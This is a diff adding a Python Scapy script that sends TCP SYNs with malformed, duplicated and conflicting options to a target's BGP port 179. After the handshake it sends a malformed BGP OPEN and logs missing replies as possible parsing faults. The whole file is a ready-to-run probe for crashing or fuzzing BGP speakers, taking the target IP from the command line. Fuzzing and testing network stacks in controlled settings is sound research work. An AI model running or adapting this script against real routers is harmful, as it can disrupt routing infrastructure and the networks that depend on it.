@@ -1,0 +1,66 @@
+
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import time
+import logging
+
+logging.basicConfig(filename='sack.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def generate_mutated_tcp_options():
+    return [
+        ('MSS', 1200),
+        ('NOP', None),
+        ('WScale', 14),
+        ('NOP', None),
+        ('SACKOK', b''),
+        ('Timestamp', (random.randint(100000, 999999), 0)),
+        ('MSS', 1300),       # duplicate
+        ('Timestamp', (0, 0)),  # duplicate
+        ('WScale', 0),       # conflicting
+        ('NOP', None),
+        ('EOL', None),
+        ('SACKOK', b''),     # repeated post-EOL
+        ('MSS', 1460),       # reintroduced again after EOL
+    ]
+
+def codex_option_storm(dst_ip, port=179):
+    for i in range(10):
+        print(f"[⚡] TCP sack {i + 1}/10")
+        ip = IP(dst=dst_ip)
+        sport = RandShort()
+
+        tcp_opts = generate_mutated_tcp_options()
+        syn = TCP(sport=sport, dport=port, flags='S', seq=1000, options=tcp_opts)
+        syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+
+        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+            print(f"[!] No SYN-ACK (strike {i + 1})")
+            logging.info(f"[{i}] SYN-ACK failed.")
+            continue
+
+        ack = TCP(sport=sport, dport=port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+        send(ip/ack, verbose=0)
+
+        # Send minimal malformed BGP packet
+        open_burst = BGPHeader(type=1)/Raw(load=b'\x04\xFC\x00\x00\x5A\x01\x02\x03\x04\x00')
+        send(ip/TCP(sport=sport, dport=port, flags='PA', seq=ack.seq, ack=ack.ack)/open_burst, verbose=0)
+
+        logging.info(f"[{i}] Sent TCP sac w/ malformed BGP OPEN.")
+
+        response = sr1(ip/TCP(sport=sport, dport=port, flags='PA', seq=ack.seq+100, ack=ack.ack)/Raw(load=b'\x00'), timeout=3, verbose=0)
+        if response:
+            print(f"[+] Response: {response.summary()}")
+            logging.info(f"[{i}] Response: {response.summary()}")
+        else:
+            print(f"[!] No response — potential option parsing fault (strike {i + 1})")
+            logging.info(f"[{i}] No response or silent drop")
+
+        time.sleep(1)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: sudo python3 sack.py <target_ip>")
+        sys.exit(1)
+    codex_option_storm(sys.argv[1])
